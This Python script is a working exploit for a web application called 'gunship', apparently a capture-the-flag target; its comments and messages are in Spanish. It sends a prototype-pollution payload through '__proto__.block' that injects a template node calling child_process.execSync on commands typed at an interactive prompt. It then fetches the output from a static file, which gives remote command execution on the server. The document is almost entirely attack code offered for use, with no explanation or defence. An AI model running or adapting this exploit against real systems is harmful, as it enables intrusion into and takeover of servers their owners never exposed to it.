import requests,sys,signal
from argparse import ArgumentParser

def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicacion...")
    sys.exit(1)

#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def exploit(direccion_ip,puerto):
    try:
        while True:
            command = input("gunship>")
            if command.lower() == 'exit':
                break
            base_url = f"http://{direccion_ip}:{puerto}"

            r = requests.post(
                base_url + "/api/submit",
                json={
                    "artist.name": "Gingell",
                    "__proto__.block": {
                        "type": "Text",
                        "line": f"console.log(process.mainModule.require('child_process').execSync('{command} > /app/static/pwned').toString())",
                    },
                },
            )
            print(requests.get(base_url+'/static/pwned').text)
    except requests.exceptions.RequestException as e:
        print(f"Error en peticion HTTP {e}")
if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="direcion ip del host comprometido", required=True)
    parser.add_argument("-p", "--port", help="puerto remoto", required=True)

    args = parser.parse_args()
    exploit(args.ip,args.port)
